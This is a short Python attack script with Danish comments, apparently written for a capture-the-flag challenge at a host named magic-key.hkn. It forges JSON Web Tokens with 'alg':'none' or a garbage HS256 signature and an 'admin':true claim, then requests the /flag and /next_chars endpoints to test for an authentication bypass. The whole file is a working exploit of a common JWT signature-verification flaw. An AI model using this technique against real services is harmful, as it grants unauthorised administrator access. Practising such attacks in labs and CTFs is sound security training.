#!/usr/bin/env python3
import base64, json, requests, time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def test(jwt, desc):
    print(f"\n### {desc} ###")
    for path in ["/next_chars?char=s", "/flag"]:
        r = requests.get(f"http://magic-key.hkn{path}", headers={"JWT": jwt}, timeout=5)
        print(f"  GET {path} -> {r.status_code}: {r.text[:200]}")

h_none = b64url(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())

# 1) alg:none, admin:true, gammelt timestamp
p1 = b64url(json.dumps({"admin":True,"timestamp":1300000000}, separators=(',',':')).encode())
test(f"{h_none}.{p1}.", "alg:none, admin:true, timestamp=1300000000")

# 2) alg:none, admin:true, timestamp = nu
p2 = b64url(json.dumps({"admin":True,"timestamp":int(time.time())}, separators=(',',':')).encode())
test(f"{h_none}.{p2}.", "alg:none, admin:true, timestamp=nu")

# 3) alg:none, admin:true, UDEN 'typ' felt (i tilfaelde af det driller)
h_none2 = b64url(json.dumps({"alg":"none"}, separators=(',',':')).encode())
test(f"{h_none2}.{p1}.", "alg:none (uden typ), admin:true")

# 4) HS256 med garbage signatur, admin:true
h_hs = b64url(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')).encode())
test(f"{h_hs}.{p1}.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "HS256 garbage signatur, admin:true")
